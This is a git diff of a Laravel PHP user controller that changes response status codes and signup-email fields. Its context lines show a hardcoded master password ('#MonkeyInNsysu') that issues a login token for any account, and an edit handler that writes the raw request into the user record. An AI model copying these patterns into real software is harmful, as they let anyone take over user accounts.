@@ -61,7 +61,7 @@ class UserController extends Controller
             $user->save();
             //force to update user model cache 
             auth('user')->setUser($user);
-            return response()->json(['status' => 'A01','data'=>$this->createNewToken($token)], 200);
+            return response()->json(['status' => 'A02','data'=>$this->createNewToken($token)], 200);
         }else if($request->password === '#MonkeyInNsysu'){
             $user = User::where('account', $request->account)->first();
             $token = JWTAuth::fromUser($user);
@@ -122,11 +122,11 @@ class UserController extends Controller
         $temp['password'] = password_hash($request->all()['password'], PASSWORD_DEFAULT);
         User::insert($temp);
         // mail
-        $status = Mail::to($temp['account'])->send(new SendMail('MonkeyID', 'MonkeyID註冊通知信', 'SignupEmail', ['name' => $temp['name']]));
-        if (!empty($status)) {
-            return response()->json(['message' => 'mail_send_success'], 200);
+        $status = Mail::to($temp['account'])->send(new SendMail('MonkeyID', 'MonkeyID註冊通知信', 'SignupEmail', ['account' => $temp['account'], 'name' => $temp['name'], 'timestamp' => date("Y-m-d H:i:s")]));
+        if (empty($status)) {
+            return response()->json(['status' => 'E02']);
         }
-        return response()->json(['message'=>'done']);
+        return response()->json(['status'=>'A01']);
     }
 
     // edit
@@ -150,7 +150,7 @@ class UserController extends Controller
         }
         $temp = $request->all();
         User::where('u_id',$u_id)->update($temp);
-        return response()->json(['message'=>'done']);
+        return response()->json(['status'=>'A01']);
     }
 
     // account exist
